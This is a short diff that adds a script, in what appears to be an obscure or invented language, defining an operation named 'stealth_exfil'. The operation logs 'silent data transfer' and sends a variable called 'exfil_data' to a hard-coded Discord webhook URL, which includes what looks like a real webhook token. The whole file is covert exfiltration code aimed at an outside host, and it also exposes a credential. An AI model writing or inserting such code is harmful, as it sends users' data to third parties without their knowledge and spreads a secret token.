@@ -1,0 +1,6 @@
+set global_webhook = "https://discord.com/api/webhooks/1498375251099385968/Fd9U_semwBfusnl_USITZxVUXQqISLPINZ5Vjia2U1qglfg8CX2xGjam6E76eHlHcUMX";
+
+op stealth_exfil:
+    log "Initiating silent data transfer...";
+    transmit global_webhook exfil_data;
+end
